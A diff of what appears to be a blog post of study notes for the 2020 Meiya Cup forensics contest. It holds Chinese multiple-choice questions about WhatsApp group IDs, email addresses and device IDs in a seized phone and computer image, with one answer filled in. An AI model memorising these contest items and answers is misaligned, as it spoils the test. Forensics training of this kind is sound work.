-<p>B:Bob/Phone/Containers/Shared/AppGroup/group.net.whatsapps.WhatsApp.sha red /Message/Media/<a href="mailto:&#x38;&#x35;&#x32;&#54;&#x32;&#53;&#52;&#x37;&#57;&#x33;&#55;&#x2d;&#x31;&#x36;&#48;&#x30;&#x33;&#x39;&#x32;&#x38;&#x37;&#56;&#x40;&#x67;&#x2e;&#x75;&#x73;">&#x38;&#x35;&#x32;&#54;&#x32;&#53;&#52;&#x37;&#57;&#x33;&#55;&#x2d;&#x31;&#x36;&#48;&#x30;&#x33;&#x39;&#x32;&#x38;&#x37;&#56;&#x40;&#x67;&#x2e;&#x75;&#x73;</a>/c/5/1230.txt </p>
-<p>C:Bob/Data/Containers/Shared/AppGroup/group.net.whatsapp.WhatsApps.shar ed /Message/Media/<a href="mailto:&#x38;&#x35;&#50;&#54;&#50;&#53;&#52;&#55;&#57;&#x33;&#55;&#45;&#49;&#54;&#48;&#x30;&#51;&#57;&#x32;&#x38;&#55;&#x38;&#64;&#103;&#x2e;&#x75;&#115;">&#x38;&#x35;&#50;&#54;&#50;&#53;&#52;&#55;&#57;&#x33;&#55;&#45;&#49;&#54;&#48;&#x30;&#51;&#57;&#x32;&#x38;&#55;&#x38;&#64;&#103;&#x2e;&#x75;&#115;</a>/c/5/c56255d0-a407-4341-afef7bf5accc52f0.txt </p>
-<p>D:Bob/Text/Containers/Shared/AppGroup/group.net.whatsapp.WhatsApp.share d /Messages/Media/<a href="mailto:&#56;&#53;&#50;&#x36;&#50;&#53;&#52;&#55;&#57;&#51;&#x37;&#45;&#49;&#54;&#48;&#x30;&#x33;&#x39;&#50;&#56;&#55;&#56;&#64;&#x67;&#46;&#117;&#115;">&#56;&#53;&#50;&#x36;&#50;&#53;&#52;&#55;&#57;&#51;&#x37;&#45;&#49;&#54;&#48;&#x30;&#x33;&#x39;&#50;&#56;&#55;&#56;&#64;&#x67;&#46;&#117;&#115;</a>/c/5/c56255d0-a407-4341- afef-7bf5accc5000.txt E:Bob/mobile/Containers/Shared/AppGroup/group.net.whatsapp.WhatsApp.sha red /Message/Media/<a href="mailto:&#56;&#x35;&#x32;&#x36;&#50;&#x35;&#52;&#55;&#x39;&#51;&#x37;&#45;&#49;&#x36;&#x30;&#x30;&#51;&#x39;&#x32;&#x38;&#55;&#56;&#64;&#103;&#x2e;&#117;&#115;">&#56;&#x35;&#x32;&#x36;&#50;&#x35;&#52;&#55;&#x39;&#51;&#x37;&#45;&#49;&#x36;&#x30;&#x30;&#51;&#x39;&#x32;&#x38;&#55;&#56;&#64;&#103;&#x2e;&#117;&#115;</a>/c/5/c56255d0-a407-4341-afef7bf5accc52f0.txt </p>
+<p>B:Bob/Phone/Containers/Shared/AppGroup/group.net.whatsapps.WhatsApp.sha red /Message/Media/<a href="mailto:&#56;&#53;&#50;&#x36;&#x32;&#53;&#52;&#55;&#x39;&#51;&#55;&#45;&#49;&#x36;&#48;&#x30;&#51;&#x39;&#50;&#x38;&#x37;&#56;&#64;&#103;&#46;&#117;&#115;">&#56;&#53;&#50;&#x36;&#x32;&#53;&#52;&#55;&#x39;&#51;&#55;&#45;&#49;&#x36;&#48;&#x30;&#51;&#x39;&#50;&#x38;&#x37;&#56;&#64;&#103;&#46;&#117;&#115;</a>/c/5/1230.txt </p>
+<p>C:Bob/Data/Containers/Shared/AppGroup/group.net.whatsapp.WhatsApps.shar ed /Message/Media/<a href="mailto:&#56;&#53;&#50;&#x36;&#x32;&#53;&#x34;&#55;&#x39;&#x33;&#x37;&#x2d;&#x31;&#54;&#x30;&#48;&#51;&#57;&#x32;&#x38;&#x37;&#56;&#x40;&#103;&#x2e;&#x75;&#x73;">&#56;&#53;&#50;&#x36;&#x32;&#53;&#x34;&#55;&#x39;&#x33;&#x37;&#x2d;&#x31;&#54;&#x30;&#48;&#51;&#57;&#x32;&#x38;&#x37;&#56;&#x40;&#103;&#x2e;&#x75;&#x73;</a>/c/5/c56255d0-a407-4341-afef7bf5accc52f0.txt </p>
+<p>D:Bob/Text/Containers/Shared/AppGroup/group.net.whatsapp.WhatsApp.share d /Messages/Media/<a href="mailto:&#x38;&#x35;&#50;&#x36;&#50;&#53;&#52;&#55;&#57;&#51;&#x37;&#x2d;&#x31;&#54;&#x30;&#48;&#x33;&#57;&#x32;&#x38;&#55;&#56;&#64;&#103;&#46;&#x75;&#115;">&#x38;&#x35;&#50;&#x36;&#50;&#53;&#52;&#55;&#57;&#51;&#x37;&#x2d;&#x31;&#54;&#x30;&#48;&#x33;&#57;&#x32;&#x38;&#55;&#56;&#64;&#103;&#46;&#x75;&#115;</a>/c/5/c56255d0-a407-4341- afef-7bf5accc5000.txt E:Bob/mobile/Containers/Shared/AppGroup/group.net.whatsapp.WhatsApp.sha red /Message/Media/<a href="mailto:&#56;&#x35;&#50;&#x36;&#x32;&#53;&#52;&#55;&#x39;&#51;&#55;&#45;&#x31;&#x36;&#x30;&#x30;&#x33;&#x39;&#x32;&#x38;&#55;&#x38;&#x40;&#103;&#46;&#117;&#x73;">&#56;&#x35;&#50;&#x36;&#x32;&#53;&#52;&#55;&#x39;&#51;&#55;&#45;&#x31;&#x36;&#x30;&#x30;&#x33;&#x39;&#x32;&#x38;&#55;&#x38;&#x40;&#103;&#46;&#117;&#x73;</a>/c/5/c56255d0-a407-4341-afef7bf5accc52f0.txt </p>
 <p>答案：</p>
-<h3 id="51、在Bob-iphone-谁是“-85262547937-x31-x36-48-x30-51-57-x32-x38-x37-x38-x40-x67-x2e-x75-x73-”的聊天群组中的管理员？"><a href="#51、在Bob-iphone-谁是“-85262547937-x31-x36-48-x30-51-57-x32-x38-x37-x38-x40-x67-x2e-x75-x73-”的聊天群组中的管理员？" class="headerlink" title="51、在Bob iphone, 谁是“ 85262547937- &#x31;&#x36;&#48;&#x30;&#51;&#57;&#x32;&#x38;&#x37;&#x38;&#x40;&#x67;&#x2e;&#x75;&#x73;”的聊天群组中的管理员？"></a>51、在Bob iphone, 谁是“ 85262547937- <a href="mailto:&#x31;&#x36;&#48;&#x30;&#51;&#57;&#x32;&#x38;&#x37;&#x38;&#x40;&#x67;&#x2e;&#x75;&#x73;">&#x31;&#x36;&#48;&#x30;&#51;&#57;&#x32;&#x38;&#x37;&#x38;&#x40;&#x67;&#x2e;&#x75;&#x73;</a>”的聊天群组中的管理员？</h3><p>A:Bob    B:Cole    C:Alice    D:Alice 及 Bob    E:Bob 及 Cole </p>
+<h3 id="51、在Bob-iphone-谁是“-85262547937-49-54-x30-x30-51-x39-50-x38-x37-56-64-x67-46-x75-x73-”的聊天群组中的管理员？"><a href="#51、在Bob-iphone-谁是“-85262547937-49-54-x30-x30-51-x39-50-x38-x37-56-64-x67-46-x75-x73-”的聊天群组中的管理员？" class="headerlink" title="51、在Bob iphone, 谁是“ 85262547937- &#49;&#54;&#x30;&#x30;&#51;&#x39;&#50;&#x38;&#x37;&#56;&#64;&#x67;&#46;&#x75;&#x73;”的聊天群组中的管理员？"></a>51、在Bob iphone, 谁是“ 85262547937- <a href="mailto:&#49;&#54;&#x30;&#x30;&#51;&#x39;&#50;&#x38;&#x37;&#56;&#64;&#x67;&#46;&#x75;&#x73;">&#49;&#54;&#x30;&#x30;&#51;&#x39;&#50;&#x38;&#x37;&#56;&#64;&#x67;&#46;&#x75;&#x73;</a>”的聊天群组中的管理员？</h3><p>A:Bob    B:Cole    C:Alice    D:Alice 及 Bob    E:Bob 及 Cole </p>
 <p>答案：</p>
-<h3 id="52、“-56-53-50-54-x32-53-x34-x37-x39-51-x37-x2d-49-x36-x30-x30-51-57-x32-56-x37-x38-64-x67-46-117-115-”聊天-群组中有多少个附件？"><a href="#52、“-56-53-50-54-x32-53-x34-x37-x39-51-x37-x2d-49-x36-x30-x30-51-57-x32-56-x37-x38-64-x67-46-117-115-”聊天-群组中有多少个附件？" class="headerlink" title="52、“ &#56;&#53;&#50;&#54;&#x32;&#53;&#x34;&#x37;&#x39;&#51;&#x37;&#x2d;&#49;&#x36;&#x30;&#x30;&#51;&#57;&#x32;&#56;&#x37;&#x38;&#64;&#x67;&#46;&#117;&#115;”聊天 群组中有多少个附件？"></a>52、“ <a href="mailto:&#56;&#53;&#50;&#54;&#x32;&#53;&#x34;&#x37;&#x39;&#51;&#x37;&#x2d;&#49;&#x36;&#x30;&#x30;&#51;&#57;&#x32;&#56;&#x37;&#x38;&#64;&#x67;&#46;&#117;&#115;">&#56;&#53;&#50;&#54;&#x32;&#53;&#x34;&#x37;&#x39;&#51;&#x37;&#x2d;&#49;&#x36;&#x30;&#x30;&#51;&#57;&#x32;&#56;&#x37;&#x38;&#64;&#x67;&#46;&#117;&#115;</a>”聊天 群组中有多少个附件？</h3><p>A:6    B:4    C:2    D:3    E:6</p>
+<h3 id="52、“-x38-x35-x32-x36-x32-x35-x34-x37-x39-x33-x37-45-x31-54-48-x30-51-57-x32-x38-55-x38-64-x67-46-117-115-”聊天-群组中有多少个附件？"><a href="#52、“-x38-x35-x32-x36-x32-x35-x34-x37-x39-x33-x37-45-x31-54-48-x30-51-57-x32-x38-55-x38-64-x67-46-117-115-”聊天-群组中有多少个附件？" class="headerlink" title="52、“ &#x38;&#x35;&#x32;&#x36;&#x32;&#x35;&#x34;&#x37;&#x39;&#x33;&#x37;&#45;&#x31;&#54;&#48;&#x30;&#51;&#57;&#x32;&#x38;&#55;&#x38;&#64;&#x67;&#46;&#117;&#115;”聊天 群组中有多少个附件？"></a>52、“ <a href="mailto:&#x38;&#x35;&#x32;&#x36;&#x32;&#x35;&#x34;&#x37;&#x39;&#x33;&#x37;&#45;&#x31;&#54;&#48;&#x30;&#51;&#57;&#x32;&#x38;&#55;&#x38;&#64;&#x67;&#46;&#117;&#115;">&#x38;&#x35;&#x32;&#x36;&#x32;&#x35;&#x34;&#x37;&#x39;&#x33;&#x37;&#45;&#x31;&#54;&#48;&#x30;&#51;&#57;&#x32;&#x38;&#55;&#x38;&#64;&#x67;&#46;&#117;&#115;</a>”聊天 群组中有多少个附件？</h3><p>A:6    B:4    C:2    D:3    E:6</p>
 <p>答案： </p>
 <h3 id="53、Bob-iPhone的Airdrop-ID是甚么？"><a href="#53、Bob-iPhone的Airdrop-ID是甚么？" class="headerlink" title="53、Bob iPhone的Airdrop ID是甚么？"></a>53、Bob iPhone的Airdrop ID是甚么？</h3><p>A:66E7BBDE9F69    B:Bob-airdrop-28455    C:67E7BBDE9F69-BOB    D:Air-Bob-66E7BBDE9F69    E:Bob-iP-66E7BBDE9F69 </p>
 <p>答案：</p>
@@ -2737,22 +2574,22 @@
 <p>D:2020/09/15 16:51 </p>
 <p>E:2020/09/15 17:57. </p>
 <p>答案：</p>
-<h3 id="在Cole手机-的用户个人资料是甚么？"><a href="#在Cole手机-的用户个人资料是甚么？" class="headerlink" title="在Cole手机, 的用户个人资料是甚么？"></a>在Cole手机, 的用户个人资料是甚么？</h3><p>A:<a href="mailto:&#99;&#x6f;&#x6c;&#101;&#x66;&#117;&#x6e;&#103;&#64;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#99;&#x6f;&#x6c;&#101;&#x66;&#117;&#x6e;&#103;&#64;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#99;&#x6f;&#109;</a> </p>
-<p>B:<a href="mailto:&#x63;&#111;&#108;&#101;&#x66;&#x75;&#110;&#x67;&#57;&#x39;&#x40;&#103;&#109;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;">&#x63;&#111;&#108;&#101;&#x66;&#x75;&#110;&#x67;&#57;&#x39;&#x40;&#103;&#109;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;</a> </p>
-<p>C:<a href="mailto:&#99;&#111;&#108;&#101;&#x39;&#48;&#57;&#x40;&#103;&#109;&#x61;&#105;&#108;&#x2e;&#99;&#x6f;&#109;">&#99;&#111;&#108;&#101;&#x39;&#48;&#57;&#x40;&#103;&#109;&#x61;&#105;&#108;&#x2e;&#99;&#x6f;&#109;</a> </p>
-<p>D:<a href="mailto:&#x63;&#x6f;&#x6c;&#x65;&#102;&#117;&#x6e;&#x67;&#x39;&#48;&#57;&#64;&#x67;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#111;&#x6d;">&#x63;&#x6f;&#x6c;&#x65;&#102;&#117;&#x6e;&#x67;&#x39;&#48;&#57;&#64;&#x67;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#111;&#x6d;</a> </p>
-<p>E:<a href="mailto:&#99;&#x6f;&#x6c;&#101;&#102;&#117;&#x6e;&#x67;&#x39;&#57;&#x39;&#x40;&#x67;&#x6d;&#x61;&#x69;&#x6c;&#46;&#99;&#111;&#x6d;">&#99;&#x6f;&#x6c;&#101;&#102;&#117;&#x6e;&#x67;&#x39;&#57;&#x39;&#x40;&#x67;&#x6d;&#x61;&#x69;&#x6c;&#46;&#99;&#111;&#x6d;</a>. </p>
+<h3 id="在Cole手机-的用户个人资料是甚么？"><a href="#在Cole手机-的用户个人资料是甚么？" class="headerlink" title="在Cole手机, 的用户个人资料是甚么？"></a>在Cole手机, 的用户个人资料是甚么？</h3><p>A:<a href="mailto:&#x63;&#111;&#108;&#101;&#102;&#117;&#x6e;&#x67;&#64;&#x67;&#109;&#x61;&#105;&#108;&#46;&#99;&#x6f;&#x6d;">&#x63;&#111;&#108;&#101;&#102;&#117;&#x6e;&#x67;&#64;&#x67;&#109;&#x61;&#105;&#108;&#46;&#99;&#x6f;&#x6d;</a> </p>
+<p>B:<a href="mailto:&#99;&#x6f;&#108;&#101;&#x66;&#117;&#110;&#x67;&#57;&#x39;&#64;&#x67;&#x6d;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;">&#99;&#x6f;&#108;&#101;&#x66;&#117;&#110;&#x67;&#57;&#x39;&#64;&#x67;&#x6d;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;</a> </p>
+<p>C:<a href="mailto:&#x63;&#111;&#108;&#x65;&#x39;&#x30;&#x39;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#111;&#109;">&#x63;&#111;&#108;&#x65;&#x39;&#x30;&#x39;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#111;&#109;</a> </p>
+<p>D:<a href="mailto:&#x63;&#x6f;&#108;&#x65;&#x66;&#x75;&#x6e;&#103;&#57;&#x30;&#57;&#64;&#x67;&#109;&#97;&#105;&#x6c;&#46;&#99;&#111;&#109;">&#x63;&#x6f;&#108;&#x65;&#x66;&#x75;&#x6e;&#103;&#57;&#x30;&#57;&#64;&#x67;&#109;&#97;&#105;&#x6c;&#46;&#99;&#111;&#109;</a> </p>
+<p>E:<a href="mailto:&#99;&#x6f;&#x6c;&#101;&#x66;&#x75;&#x6e;&#103;&#x39;&#57;&#x39;&#64;&#x67;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#x6d;">&#99;&#x6f;&#x6c;&#101;&#x66;&#x75;&#x6e;&#103;&#x39;&#57;&#x39;&#64;&#x67;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#x6d;</a>. </p>
 <p>答案：</p>
-<h3 id="Cole的手机上有社交媒体帐户吗？如有，那是甚么？"><a href="#Cole的手机上有社交媒体帐户吗？如有，那是甚么？" class="headerlink" title="Cole的手机上有社交媒体帐户吗？如有，那是甚么？"></a>Cole的手机上有社交媒体帐户吗？如有，那是甚么？</h3><p>A:<a href="mailto:&#54;&#51;&#x37;&#x36;&#x36;&#52;&#54;&#x35;&#x40;&#115;&#x2e;&#119;&#x68;&#97;&#116;&#x73;&#x61;&#x70;&#112;&#46;&#110;&#101;&#x74;">&#54;&#51;&#x37;&#x36;&#x36;&#52;&#54;&#x35;&#x40;&#115;&#x2e;&#119;&#x68;&#97;&#116;&#x73;&#x61;&#x70;&#112;&#46;&#110;&#101;&#x74;</a> </p>
-<p>B:<a href="mailto:&#56;&#x35;&#50;&#x36;&#x33;&#x37;&#54;&#x36;&#x34;&#x36;&#53;&#x40;&#x73;&#x2e;&#119;&#x68;&#x61;&#x74;&#115;&#x61;&#x70;&#x70;&#x2e;&#x6e;&#x65;&#x74;">&#56;&#x35;&#50;&#x36;&#x33;&#x37;&#54;&#x36;&#x34;&#x36;&#53;&#x40;&#x73;&#x2e;&#119;&#x68;&#x61;&#x74;&#115;&#x61;&#x70;&#x70;&#x2e;&#x6e;&#x65;&#x74;</a> </p>
-<p>C:<a href="mailto:&#56;&#53;&#50;&#x2d;&#x36;&#50;&#55;&#54;&#54;&#52;&#54;&#x35;&#64;&#x73;&#x2e;&#x77;&#x68;&#x61;&#116;&#115;&#x61;&#x70;&#112;&#x2e;&#110;&#x65;&#116;">&#56;&#53;&#50;&#x2d;&#x36;&#50;&#55;&#54;&#54;&#52;&#54;&#x35;&#64;&#x73;&#x2e;&#x77;&#x68;&#x61;&#116;&#115;&#x61;&#x70;&#112;&#x2e;&#110;&#x65;&#116;</a> </p>
-<p>D:<a href="mailto:&#67;&#56;&#x35;&#x32;&#x36;&#51;&#x37;&#x36;&#54;&#52;&#x36;&#x35;&#64;&#115;&#46;&#119;&#104;&#97;&#116;&#x73;&#97;&#x70;&#112;&#46;&#x6e;&#101;&#116;">&#67;&#56;&#x35;&#x32;&#x36;&#51;&#x37;&#x36;&#54;&#52;&#x36;&#x35;&#64;&#115;&#46;&#119;&#104;&#97;&#116;&#x73;&#97;&#x70;&#112;&#46;&#x6e;&#101;&#116;</a> </p>
-<p>E:<a href="mailto:&#67;&#79;&#76;&#x45;&#45;&#x36;&#x33;&#x37;&#x36;&#x36;&#52;&#54;&#53;&#64;&#115;&#x2e;&#x77;&#x68;&#x61;&#x74;&#x73;&#x61;&#112;&#x70;&#x2e;&#110;&#101;&#x74;">&#67;&#79;&#76;&#x45;&#45;&#x36;&#x33;&#x37;&#x36;&#x36;&#52;&#54;&#53;&#64;&#115;&#x2e;&#x77;&#x68;&#x61;&#x74;&#x73;&#x61;&#112;&#x70;&#x2e;&#110;&#101;&#x74;</a>. </p>
+<h3 id="Cole的手机上有社交媒体帐户吗？如有，那是甚么？"><a href="#Cole的手机上有社交媒体帐户吗？如有，那是甚么？" class="headerlink" title="Cole的手机上有社交媒体帐户吗？如有，那是甚么？"></a>Cole的手机上有社交媒体帐户吗？如有，那是甚么？</h3><p>A:<a href="mailto:&#54;&#51;&#x37;&#x36;&#x36;&#x34;&#54;&#x35;&#64;&#x73;&#46;&#119;&#104;&#97;&#x74;&#x73;&#97;&#x70;&#112;&#46;&#x6e;&#101;&#x74;">&#54;&#51;&#x37;&#x36;&#x36;&#x34;&#54;&#x35;&#64;&#x73;&#46;&#119;&#104;&#97;&#x74;&#x73;&#97;&#x70;&#112;&#46;&#x6e;&#101;&#x74;</a> </p>
+<p>B:<a href="mailto:&#56;&#x35;&#50;&#x36;&#51;&#55;&#54;&#x36;&#x34;&#54;&#53;&#64;&#115;&#46;&#x77;&#x68;&#97;&#x74;&#115;&#97;&#x70;&#x70;&#46;&#110;&#101;&#x74;">&#56;&#x35;&#50;&#x36;&#51;&#55;&#54;&#x36;&#x34;&#54;&#53;&#64;&#115;&#46;&#x77;&#x68;&#97;&#x74;&#115;&#97;&#x70;&#x70;&#46;&#110;&#101;&#x74;</a> </p>
+<p>C:<a href="mailto:&#x38;&#x35;&#50;&#x2d;&#54;&#x32;&#55;&#x36;&#54;&#52;&#54;&#x35;&#64;&#x73;&#x2e;&#119;&#x68;&#x61;&#116;&#x73;&#97;&#x70;&#112;&#x2e;&#110;&#101;&#x74;">&#x38;&#x35;&#50;&#x2d;&#54;&#x32;&#55;&#x36;&#54;&#52;&#54;&#x35;&#64;&#x73;&#x2e;&#119;&#x68;&#x61;&#116;&#x73;&#97;&#x70;&#112;&#x2e;&#110;&#101;&#x74;</a> </p>
+<p>D:<a href="mailto:&#67;&#56;&#x35;&#50;&#x36;&#x33;&#55;&#x36;&#x36;&#x34;&#x36;&#53;&#64;&#115;&#46;&#119;&#x68;&#x61;&#116;&#x73;&#97;&#112;&#x70;&#46;&#x6e;&#101;&#116;">&#67;&#56;&#x35;&#50;&#x36;&#x33;&#55;&#x36;&#x36;&#x34;&#x36;&#53;&#64;&#115;&#46;&#119;&#x68;&#x61;&#116;&#x73;&#97;&#112;&#x70;&#46;&#x6e;&#101;&#116;</a> </p>
+<p>E:<a href="mailto:&#67;&#79;&#x4c;&#69;&#45;&#54;&#51;&#x37;&#x36;&#54;&#x34;&#54;&#x35;&#x40;&#115;&#x2e;&#119;&#104;&#x61;&#116;&#115;&#x61;&#x70;&#x70;&#46;&#110;&#101;&#x74;">&#67;&#79;&#x4c;&#69;&#45;&#54;&#51;&#x37;&#x36;&#54;&#x34;&#54;&#x35;&#x40;&#115;&#x2e;&#119;&#104;&#x61;&#116;&#115;&#x61;&#x70;&#x70;&#46;&#110;&#101;&#x74;</a>. </p>
 <p>答案：</p>
-<h3 id="Cole与Bob和Alice在同一个小组中进行过交流吗？它是甚么？"><a href="#Cole与Bob和Alice在同一个小组中进行过交流吗？它是甚么？" class="headerlink" title="Cole与Bob和Alice在同一个小组中进行过交流吗？它是甚么？"></a>Cole与Bob和Alice在同一个小组中进行过交流吗？它是甚么？</h3><p>A:是的，在whatsapp组ID中的群聊消息：<a href="mailto:&#x38;&#53;&#50;&#x36;&#50;&#53;&#x34;&#55;&#x39;&#51;&#x37;&#45;&#x31;&#54;&#48;&#48;&#51;&#x39;&#50;&#56;&#x37;&#56;&#x40;&#x67;&#x2e;&#x75;&#x73;">&#x38;&#53;&#50;&#x36;&#50;&#53;&#x34;&#55;&#x39;&#51;&#x37;&#45;&#x31;&#54;&#48;&#48;&#51;&#x39;&#50;&#56;&#x37;&#56;&#x40;&#x67;&#x2e;&#x75;&#x73;</a> </p>
-<p>B:是的，在whatsapp组ID中的群聊消息：<a href="mailto:&#x38;&#x35;&#50;&#54;&#x32;&#53;&#x34;&#55;&#57;&#51;&#x37;&#x2d;&#49;&#x36;&#x30;&#x30;&#x33;&#x39;&#50;&#56;&#x37;&#56;&#64;&#x67;&#46;&#x68;&#107;">&#x38;&#x35;&#50;&#54;&#x32;&#53;&#x34;&#55;&#57;&#51;&#x37;&#x2d;&#49;&#x36;&#x30;&#x30;&#x33;&#x39;&#50;&#56;&#x37;&#56;&#64;&#x67;&#46;&#x68;&#107;</a> </p>
+<h3 id="Cole与Bob和Alice在同一个小组中进行过交流吗？它是甚么？"><a href="#Cole与Bob和Alice在同一个小组中进行过交流吗？它是甚么？" class="headerlink" title="Cole与Bob和Alice在同一个小组中进行过交流吗？它是甚么？"></a>Cole与Bob和Alice在同一个小组中进行过交流吗？它是甚么？</h3><p>A:是的，在whatsapp组ID中的群聊消息：<a href="mailto:&#56;&#x35;&#x32;&#x36;&#50;&#53;&#x34;&#x37;&#x39;&#51;&#x37;&#45;&#49;&#x36;&#48;&#x30;&#51;&#57;&#x32;&#x38;&#55;&#56;&#64;&#103;&#x2e;&#117;&#x73;">&#56;&#x35;&#x32;&#x36;&#50;&#53;&#x34;&#x37;&#x39;&#51;&#x37;&#45;&#49;&#x36;&#48;&#x30;&#51;&#57;&#x32;&#x38;&#55;&#56;&#64;&#103;&#x2e;&#117;&#x73;</a> </p>
+<p>B:是的，在whatsapp组ID中的群聊消息：<a href="mailto:&#x38;&#x35;&#50;&#x36;&#x32;&#x35;&#52;&#x37;&#57;&#x33;&#55;&#45;&#49;&#54;&#x30;&#48;&#x33;&#x39;&#50;&#56;&#x37;&#x38;&#64;&#x67;&#x2e;&#x68;&#x6b;">&#x38;&#x35;&#50;&#x36;&#x32;&#x35;&#52;&#x37;&#57;&#x33;&#55;&#45;&#49;&#54;&#x30;&#48;&#x33;&#x39;&#50;&#56;&#x37;&#x38;&#64;&#x67;&#x2e;&#x68;&#x6b;</a> </p>
 <p>C:是的，在whatsapp组ID中的群聊消息：85252547937-1600392878@.us </p>
-<p>D:是的，在whatsapp组ID中的群聊消息：<a href="mailto:&#54;&#x32;&#53;&#52;&#x37;&#57;&#x33;&#x37;&#45;&#x31;&#54;&#x30;&#48;&#51;&#x39;&#x32;&#x38;&#x37;&#x38;&#x40;&#103;&#x2e;&#x75;&#115;">&#54;&#x32;&#53;&#52;&#x37;&#57;&#x33;&#x37;&#45;&#x31;&#54;&#x30;&#48;&#51;&#x39;&#x32;&#x38;&#x37;&#x38;&#x40;&#103;&#x2e;&#x75;&#115;</a> </p>
+<p>D:是的，在whatsapp组ID中的群聊消息：<a href="mailto:&#x36;&#50;&#x35;&#52;&#55;&#x39;&#x33;&#55;&#45;&#49;&#x36;&#x30;&#48;&#51;&#57;&#50;&#56;&#x37;&#x38;&#x40;&#x67;&#x2e;&#x75;&#115;">&#x36;&#50;&#x35;&#52;&#55;&#x39;&#x33;&#55;&#45;&#49;&#x36;&#x30;&#48;&#51;&#57;&#50;&#56;&#x37;&#x38;&#x40;&#x67;&#x2e;&#x75;&#115;</a> </p>
 <p>E:不，他们在Cole的设备中找不到公共聊天组. </p>
 <p>答案：</p>
 <h3 id="Cole手机的Android-ID是甚么？"><a href="#Cole手机的Android-ID是甚么？" class="headerlink" title="Cole手机的Android ID是甚么？"></a>Cole手机的Android ID是甚么？</h3><p>A:a626a98cb2bb965ec </p>
@@ -2789,18 +2626,18 @@
 <p>答案：B</p>
 <p>在取证大师中，可以看到分区二有WINDOWS文件夹，故其为操作系统盘</p>
 <p><img src="/2021/11/03/%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E4%BD%93%E8%B5%9B2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211107000729686.png" alt="image-20211107000729686"></p>
-<h3 id="在桌上计算器机中找到Daniel的电子邮件地址是-甚么？"><a href="#在桌上计算器机中找到Daniel的电子邮件地址是-甚么？" class="headerlink" title="在桌上计算器机中找到Daniel的电子邮件地址是 甚么？"></a>在桌上计算器机中找到Daniel的电子邮件地址是 甚么？</h3><p>A:<a href="mailto:&#100;&#97;&#x6e;&#105;&#x65;&#108;&#x34;&#x33;&#51;&#52;&#x36;&#x40;&#x67;&#109;&#97;&#105;&#108;&#46;&#99;&#111;&#x6d;">&#100;&#97;&#x6e;&#105;&#x65;&#108;&#x34;&#x33;&#51;&#52;&#x36;&#x40;&#x67;&#109;&#97;&#105;&#108;&#46;&#99;&#111;&#x6d;</a> </p>
-<p>B:<a href="mailto:&#x64;&#x61;&#110;&#105;&#x65;&#x6c;&#108;&#97;&#x77;&#x34;&#x33;&#x33;&#x34;&#54;&#64;&#103;&#109;&#x61;&#x69;&#x6c;&#46;&#99;&#111;&#109;">&#x64;&#x61;&#110;&#105;&#x65;&#x6c;&#108;&#97;&#x77;&#x34;&#x33;&#x33;&#x34;&#54;&#64;&#103;&#109;&#x61;&#x69;&#x6c;&#46;&#99;&#111;&#109;</a> </p>
-<p>C:<a href="mailto:&#x64;&#x61;&#x6e;&#105;&#101;&#108;&#108;&#x61;&#119;&#52;&#51;&#51;&#x34;&#x36;&#64;&#x79;&#97;&#104;&#111;&#111;&#x2e;&#99;&#111;&#x6d;">&#x64;&#x61;&#x6e;&#105;&#101;&#108;&#108;&#x61;&#119;&#52;&#51;&#51;&#x34;&#x36;&#64;&#x79;&#97;&#104;&#111;&#111;&#x2e;&#99;&#111;&#x6d;</a> </p>
-<p>D:<a href="mailto:&#x64;&#x61;&#110;&#x69;&#x65;&#x6c;&#x6c;&#x61;&#x77;&#52;&#x33;&#x33;&#52;&#54;&#64;&#x79;&#x61;&#104;&#x6f;&#111;&#x2e;&#x63;&#x6f;&#x6d;&#x2e;&#104;&#107;">&#x64;&#x61;&#110;&#x69;&#x65;&#x6c;&#x6c;&#x61;&#x77;&#52;&#x33;&#x33;&#52;&#54;&#64;&#x79;&#x61;&#104;&#x6f;&#111;&#x2e;&#x63;&#x6f;&#x6d;&#x2e;&#104;&#107;</a> </p>
-<p>E:<a href="mailto:&#100;&#x61;&#x6e;&#105;&#101;&#x6c;&#108;&#97;&#119;&#52;&#51;&#x33;&#52;&#x36;&#x40;&#121;&#x6d;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#x6d;">&#100;&#x61;&#x6e;&#105;&#101;&#x6c;&#108;&#97;&#119;&#52;&#51;&#x33;&#52;&#x36;&#x40;&#121;&#x6d;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#x6d;</a>. </p>
+<h3 id="在桌上计算器机中找到Daniel的电子邮件地址是-甚么？"><a href="#在桌上计算器机中找到Daniel的电子邮件地址是-甚么？" class="headerlink" title="在桌上计算器机中找到Daniel的电子邮件地址是 甚么？"></a>在桌上计算器机中找到Daniel的电子邮件地址是 甚么？</h3><p>A:<a href="mailto:&#100;&#97;&#x6e;&#105;&#x65;&#x6c;&#52;&#51;&#51;&#52;&#x36;&#x40;&#103;&#109;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;">&#100;&#97;&#x6e;&#105;&#x65;&#x6c;&#52;&#51;&#51;&#52;&#x36;&#x40;&#103;&#109;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#109;</a> </p>
+<p>B:<a href="mailto:&#100;&#x61;&#110;&#x69;&#101;&#108;&#x6c;&#97;&#x77;&#x34;&#x33;&#x33;&#52;&#54;&#64;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#109;">&#100;&#x61;&#110;&#x69;&#101;&#108;&#x6c;&#97;&#x77;&#x34;&#x33;&#x33;&#52;&#54;&#64;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#109;</a> </p>
